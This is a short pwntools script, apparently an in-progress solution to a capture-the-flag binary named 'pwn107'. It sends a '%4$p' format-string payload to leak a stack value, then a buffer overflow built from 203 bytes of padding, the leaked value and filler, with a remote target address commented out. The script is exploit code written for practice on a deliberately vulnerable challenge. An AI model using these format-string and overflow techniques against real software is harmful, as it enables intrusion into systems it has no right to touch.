
from pwn import *
from sys import argv

#context.log_level = "debug"
context.binary = binary = ELF('./pwn107-1644307530397.pwn107')


p = process('./pwn107-1644307530397.pwn107')

pid = util.proc.pidof(p)[0]
util.proc.wait_for_debugger(pid)

#p = remote('10.10.127.226', 9006)
#gdb.attach(p)
p.recvuntil(b"What's your last streak? ")
p.sendline(b'%4$p')
recv = p.recv()

recv = str(recv).split("\\n")[1]

print(recv)

leak = recv.split(': ')[1]
leak = p64(int(leak, 16))
pad = b'A'*203   #int(argv[1])

p.sendline(pad+leak+b'BBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC')

#p.interactive()
